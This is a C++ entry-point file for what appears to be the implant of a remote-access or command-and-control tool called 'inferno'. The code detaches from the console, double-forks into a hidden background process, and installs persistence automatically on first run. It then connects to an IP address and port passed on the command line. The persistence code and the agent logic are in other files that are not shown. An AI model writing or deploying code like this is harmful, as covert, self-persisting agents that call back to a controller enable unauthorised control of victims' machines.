#include "../include/Agent.hpp"
#include "../../common/include/CryptoContext.hpp"
#include <iostream>

#ifdef _WIN32
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#else
#include <unistd.h>
#include <sys/stat.h>
#endif

namespace {

void daemonize() {
#ifdef INFERNO_TESTING
    return; // Keep console visible in test builds
#endif

    // When launched by launchd (parent PID is 1), skip daemonization.
    // launchd handles backgrounding, and we need it to track the process
    // for KeepAlive restart-on-crash to work.
    if (::getppid() == 1) {
        return;
    }

#ifdef _WIN32
    // Detach from the parent console. If the binary is compiled with
    // /SUBSYSTEM:WINDOWS (CMake: WIN32_EXECUTABLE), no console is created
    // at all. This call handles the case where it's run from a console.
    if (FreeConsole()) {
        // Successfully detached
    }
#else
    // Double-fork daemonization (POSIX)
    pid_t pid = ::fork();
    if (pid < 0) {
        return; // fork failed — continue anyway
    }
    if (pid > 0) {
        ::exit(0); // Parent exits — child continues
    }

    // First child: create new session, detach from terminal
    ::setsid();
    ::umask(0);

    // Second fork — grandchild becomes the actual agent
    pid = ::fork();
    if (pid < 0) {
        return;
    }
    if (pid > 0) {
        ::exit(0); // First child exits — grandchild continues
    }

    // Grandchild: redirect stdio to /dev/null
    (void)::freopen("/dev/null", "r", stdin);
    (void)::freopen("/dev/null", "w", stdout);
    (void)::freopen("/dev/null", "w", stderr);
#endif
}

} // anonymous namespace

int main(int argc, char* argv[]) {
    daemonize();

    std::string ip = "127.0.0.1";
    uint16_t port = 8080;

    if (argc >= 3) {
        ip = argv[1];
        try {
            size_t consumed = 0;
            int p = std::stoi(argv[2], &consumed);
            if (consumed != std::string(argv[2]).length() || p < 1 || p > 65535) {
                throw std::out_of_range("Invalid port");
            }
            port = static_cast<uint16_t>(p);
        } catch (...) {
            return 1;
        }
    }

    inferno::CryptoContext::instance().initDefault();

    // Install persistence on first run (Phase 2.5)
    if (argc > 0 && argv[0]) {
        inferno::Agent::installPersistence(argv[0], ip, port);
    }
    
    inferno::Agent agent(ip, port);
    agent.run();

    return 0;
}
